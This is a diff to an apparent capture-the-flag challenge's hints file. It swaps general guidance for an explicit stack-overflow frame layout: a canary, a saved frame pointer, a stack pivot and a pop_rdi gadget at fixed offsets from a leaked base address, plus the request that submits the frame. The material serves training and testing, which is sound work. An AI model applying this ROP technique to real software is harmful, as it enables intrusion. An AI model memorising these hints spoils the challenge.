@@ -1125,12 +1125,14 @@ hints:
     - kind: client_route
       id: process.collision-inputs
   W28.2:
-    h1: Begin with the constrained engineering utility and its control-authority exchange. Its published client
-      document exposes the release confirmation operation, so use that ordinary contract instead of guessing a path.
-    h2: Treat this as control-flow recovery within a deliberately small executable surface. Observe the ordinary
-      and denied cases first, then change one input at a time and keep every unrelated binding fixed.
-    h3: Locate the release confirmation operation in the published client reference. Record the normal result and
-      a denied variant, alter one dimension, and keep the service-owned evidence needed to explain the difference.
+    h1: POST /api/release-plans/current/confirmation with {"session_id":"<W28.1 session>","length":240,
+      "frame_b64":"<frame>"}. The binary validates the frame with frame_valid() and outputs
+      {"controlled_flow":true} if it passes. No actual exploitation — it checks the proof-of-work structure.
+    h2: Frame layout (240 bytes total): [192 zeros][8 zeros][canary LE][base+224 LE][pivot LE][pop_rdi LE][controlled LE].
+      pivot = base + stack_pivot_off (4752). pop_rdi = base + pop_rdi_off (4704). controlled = base + 4768.
+      base = session pie_base from W28.1. canary = session canary from W28.1.
+    h3: Get all offsets from relationship.json (returned in W28.1 response). chain_offset=224, so saved_rbp=base+224.
+      The frame validates: canary at 200, saved_rbp at 208, saved_return (pivot) at 216, pop_rdi at 224, controlled at 232.
     references:
     - kind: client_route
       id: process.release-confirmation
